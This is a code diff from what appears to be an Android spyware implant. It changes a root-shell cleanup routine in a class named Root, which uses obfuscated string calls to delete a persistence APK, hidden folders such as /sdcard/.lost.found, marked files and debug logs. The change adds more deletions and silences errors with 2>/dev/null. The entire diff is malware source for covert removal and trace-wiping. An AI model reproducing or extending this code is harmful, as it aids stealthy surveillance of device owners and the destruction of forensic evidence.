@@ -331,26 +331,27 @@ public class Root {
 				 * 4) add at the end of the scrip /data/app/<apkPath>.apk removal
 				 */
 
-			script += String.format(M.e(" [ -e %s ] && rm %s"), Status.persistencyApk, Status.persistencyApk) + "\n";
-			script += String.format(M.e(" [ -e %s ] && rm -r %s"), M.e("/sdcard/.lost.found"), M.e("/sdcard/.lost.found")) + "\n";
-
+			script += String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), Status.persistencyApk, Status.persistencyApk) + "\n";
+			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found"), M.e("/sdcard/.lost.found")) + "\n";
+			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/1"), M.e("/sdcard/1")) + "\n";
+			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/2"), M.e("/sdcard/2")) + "\n";
 			script += Configuration.shellFile + M.e(" blr") + "\n";
 			script += Configuration.shellFile + M.e(" ru") + "\n";
-			script += M.e("sleep 1; ") + String.format(M.e(" [ -e %s ] && rm %s"), apkPath, apkPath) + "\n";
+			script += M.e("sleep 1; ") + String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), apkPath, apkPath) + "\n";
 
 
 			ArrayList<String> fl = markup.unserialize(new ArrayList<String>());
 			if (!fl.isEmpty()) {
 				for (String s : fl) {
-					script += String.format(M.e("for i in `ls  %s 2>/dev/null`; do [ -e $i ] && rm $i; done"), s) + "\n";
+					script += String.format(M.e("for i in `ls  %s 2>/dev/null`; do [ -e $i ] && rm $i 2>/dev/null; done"), s) + "\n";
 				}
 			}
 			markup.removeMarkup();
 
 
 			if (Cfg.DEBUG) {
-				if (new AutoFile(M.e("rm /data/local/tmp/log")).exists()) {
-					script += M.e("rm /data/local/tmp/log") + "\n";
+				if (new AutoFile(M.e("rm /data/local/tmp/log 2>/dev/null")).exists()) {
+					script += M.e("rm /data/local/tmp/log 2>/dev/null") + "\n";
 				}
 			}
 
